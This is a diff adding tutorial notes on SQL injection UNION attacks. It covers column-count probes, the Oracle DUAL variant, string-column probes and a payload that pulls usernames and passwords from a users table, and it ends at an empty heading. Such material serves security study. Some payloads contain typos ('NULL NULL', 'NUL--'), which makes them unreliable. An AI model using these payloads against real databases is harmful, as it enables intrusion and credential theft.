@@ -41,3 +41,45 @@ For example if the injection point is a quoted string within the `WHERE` clause 
 ' ORDER BY 2--
 ' ORDER BY 3--
 ```
+
+The second method involves submitting a series of `UNION SELECT`
+
+```
+' UNION SELECT NULL--
+' UNION SELECT NULL, NULL--
+' UNION SELECT NULL NULL, NULL--
+```
+
+### On Oracle every SELECT must use the FROM keyword
+
+There is a build-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would look like:
+```
+' UNION SELECT NULL FROM DUAL--
+```
+
+#### Finding columns with a useful data type
+***
+`UNION` attack enables you to retrive the results from an injected query. 
+
+The interesting data that you want to retrieve is normally in form of a string 
+
+After you determine the number of columns, you can probe column to test whether it can hold string data
+
+```
+' UNION SELECT 'a',NULL,NULL,NULL,NUL--
+' UNION SELECT NULL,'a',NULL,NULL,NUL--
+' UNION SELECT NULL,NULL,'a',NULL,NUL--
+```
+
+The error massage could be `Conversion failed when converting the varchar value 'a' to data type int.`
+
+#### Retrieving interesting data 
+***
+
+In case if we know, that database has a table called `users` that has two columns `username` and `password`, we can craft a query to retrieve all data from `users` table
+
+```
+' UNION SELECT username, password FROM users--
+```
+
+#### Retrieving multiple values within a single column
